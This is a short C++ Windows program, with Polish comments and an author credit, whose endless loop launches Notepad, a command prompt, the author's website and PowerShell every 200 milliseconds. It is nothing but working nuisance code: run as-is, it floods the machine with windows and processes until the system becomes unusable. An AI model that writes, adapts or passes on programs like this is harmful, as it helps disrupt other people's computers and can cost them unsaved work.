// kodował Jakub Famielec

#include <Windows.h>

int main()
{
    while (true)
    {
        Sleep(200);
        ShellExecuteA(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOWDEFAULT); //otwarcie notatnika
        ShellExecuteA(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOWDEFAULT); //otwarcie wiersza polecenia
        ShellExecuteA(NULL, "open", "https://alesuperstrona.5v.pl", NULL, NULL, SW_SHOWDEFAULT); //otwarcie mojej strony
        ShellExecuteA(NULL, "open", "powershell.exe", NULL, NULL, SW_SHOWDEFAULT); //otwarcie powershella
    }
}
